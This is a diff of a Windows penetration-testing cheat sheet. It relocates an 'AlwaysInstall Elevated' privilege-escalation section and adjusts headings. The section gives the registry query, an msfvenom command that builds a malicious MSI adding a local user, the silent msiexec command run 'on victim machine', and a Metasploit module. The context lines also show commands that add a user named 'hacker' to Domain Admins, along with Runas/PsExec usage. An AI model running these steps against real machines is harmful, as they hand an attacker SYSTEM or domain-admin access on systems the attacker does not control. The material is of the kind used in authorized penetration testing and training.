@@ -521,31 +521,7 @@ namespace DownloadImage
 }
 ```
 
-### **AlwaysInstall Elevated**
-
-Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
-
-```text
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-#### msfvenom
-
-```text
-msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
-```
-
-#### msiexec \(on victim machine\)
-
-```text
-msiexec /quiet /qn /i C:\create_user.msi
-```
-
-#### Metasploit module
-
-```text
-use exploit/windows/local/always_install_elevated
-```
+## **Users**
 
 ### **Add User**
 
@@ -601,7 +577,7 @@ C:\> net user hacker /add /domain
 C:\> net group "Domain Admins" hacker /add /domain
 ```
 
-### Covert to and from Base64 with PowerShell
+## Covert to and from Base64 with PowerShell
 
 #### Convert to base64
 
@@ -624,7 +600,7 @@ powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64St
 # hostname\username
 ```
 
-### Using `Runas` to execute commands as another user
+## Using `Runas` to execute commands as another user
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -659,6 +635,32 @@ PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
 ```
 {% endtab %}
 {% endtabs %}
+
+## **AlwaysInstall Elevated**
+
+Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
+
+```text
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+#### msfvenom
+
+```text
+msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
+```
+
+#### msiexec \(on victim machine\)
+
+```text
+msiexec /quiet /qn /i C:\create_user.msi
+```
+
+#### Metasploit module
+
+```text
+use exploit/windows/local/always_install_elevated
+```
 
 ## References
 
